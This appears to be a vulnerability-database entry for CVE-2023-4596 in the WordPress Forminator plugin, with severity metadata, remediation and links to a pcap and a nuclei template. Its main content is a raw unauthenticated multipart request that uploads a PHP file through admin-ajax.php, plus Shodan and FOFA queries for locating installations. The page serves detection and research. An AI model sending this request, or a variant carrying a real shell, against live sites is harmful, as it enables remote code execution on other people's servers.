---
layout: post
cve_id: CVE-2023-4596
title: WordPress Plugin Forminator 1.24.6 - Arbitrary File Upload
pcap: true
pcap_path: /pcaps/2023/CVE-2023-4596.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-4596.yaml
snort2_rule: N/A
snort3_rule: N/A
author: E1A
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary files including malicious
  PHP code, potentially leading to complete server compromise and remote code execution.

  '
remediation: 'Update the Forminator plugin to version 1.24.7 or later which includes
  proper file type validation.

  '
reference:
- https://www.exploit-db.com/exploits/51664
- https://www.wordfence.com/threat-intel/vulnerabilities/id/9cd87da6-1f4c-4a15-8ebb-6e0f8ef72513?source=cve
- https://plugins.trac.wordpress.org/changeset/2954409/forminator/trunk/library/fields/postdata.php
- https://github.com/E1A/CVE-2023-4596
- https://nvd.nist.gov/vuln/detail/CVE-2023-4596
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-4596
  cwe-id: CWE-434
  epss-score: 0.93072
  epss-percentile: 0.99774
  cpe: cpe:2.3:a:incsub:forminator:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: incsub
  product: forminator
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/forminator
  fofa-query: body=/wp-content/plugins/forminator
  publicwww-query:
  - /wp-content/plugins/Forminator
  - /wp-content/plugins/forminator
tags:
- cve2023
- cve
- forminator
- wordpress
- wp
- wp-plugin
- fileupload
- intrusive
- rce
- incsub
- vkev
- vuln
---

## üîç Vulnerability Description
The Forminator plugin for WordPress is vulnerable to arbitrary file uploads due to file type validation occurring after a file has been uploaded to the server in the upload_post_image() function in versions up to, and including, 1.24.6. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected site's server which may make remote code execution possible.


## üåê HTTP Request
```nohighlight
GET / HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.2 Safari/605.1.15
Connection: close
Content-Length: 1190
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBLOYSueQAdgN2PRe
Accept-Encoding: gzip
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="textarea-1"
38BazbnBIH5SZj3QVwywbkQK80p
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="phone-1"
1550952239
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="email-1"
test@gmail.com
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="name-1"
38BazbnBIH5SZj3QVwywbkQK80p
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="postdata-1-post-image"; filename="38BazbnBIH5SZj3QVwywbkQK80p.php"
Content-Type: application/x-php
<?php echo md5("CVE-2023-4596");unlink(__FILE__);?>
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="forminator_nonce"
Bd8J53
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="form_id"
aOob5n
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="current_url"
http://www.victim.com
------WebKitFormBoundaryBLOYSueQAdgN2PRe
Content-Disposition: form-data; name="action"
forminator_submit_form_custom-forms
------WebKitFormBoundaryBLOYSueQAdgN2PRe
```

